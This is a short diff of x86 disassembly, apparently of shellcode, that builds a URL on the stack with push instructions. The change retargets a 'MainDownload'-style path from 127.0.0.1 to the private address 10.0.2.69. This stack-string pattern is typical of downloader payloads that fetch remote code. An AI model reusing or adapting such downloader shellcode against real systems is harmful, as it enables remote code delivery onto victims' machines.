@@ -93,8 +93,8 @@
   401104: 68 6e 6c 6f 61                pushl   $0x616f6c6e             # imm = 0x616F6C6E
   401109: 68 6e 44 6f 77                pushl   $0x776f446e             # imm = 0x776F446E
   40110e: 68 2f 4d 61 69                pushl   $0x69614d2f             # imm = 0x69614D2F
-  401113: 68 2e 30 2e 31                pushl   $0x312e302e             # imm = 0x312E302E
-  401118: 68 32 37 2e 30                pushl   $0x302e3732             # imm = 0x302E3732
+  401113: 68 32 2e 36 39                pushl   $0x39362e32             # imm = 0x39362E32
+  401118: 68 30 2e 30 2e                pushl   $0x2e302e30             # imm = 0x2E302E30
   40111d: 68 3a 2f 2f 31                pushl   $0x312f2f3a             # imm = 0x312F2F3A
   401122: 68 68 74 74 70                pushl   $0x70747468             # imm = 0x70747468
   401127: 54                            pushl   %esp
